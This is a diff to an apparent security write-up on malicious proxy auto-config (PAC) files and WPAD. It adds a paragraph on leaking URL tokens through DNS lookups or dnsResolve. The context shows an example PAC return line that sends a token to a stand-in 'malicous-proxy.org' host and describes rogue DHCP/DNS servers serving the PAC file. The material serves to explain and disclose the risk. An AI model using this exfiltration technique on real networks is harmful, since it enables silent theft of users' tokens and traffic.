@@ -132,6 +132,8 @@ A malicious PAC file would have access to this information. It could then procee
 "PROXY token.2348ab92ab34cdeaf.malicous-proxy.org:8080"
 ```
 
+This would in turn cause a DNS lookup with the leaked token. If the attacker controls the DNS server (and this is pretty much possible with a fast DHCP server), he or she would then have retrieved the data. Another option for the attacker would be to simply make a direct DNS request using the `dnsResolve` function available from inside the PAC file.
+
 ### WPAD Considered Harmful
 Although the problem is not directly linked to WPAD, it does compound the problem. An attacker could simply set a rogue (but fast) DHCP server in a shared network, then proceed to hand out malicious DNSs that point to his or her PAC file. All clients with WPAD enabled would silently fall into the trap. And they would do so transparently. As long as the malicious proxy, DNS and DHCP servers are fast enough, users won't notice. Only a security conscious user may for any reason access the proxy settings of his or her computer and then take note a proxy is in use. Still, he would not realize of the malicious behaviour until checking the PAC file or the network requests performed against the proxy.
 
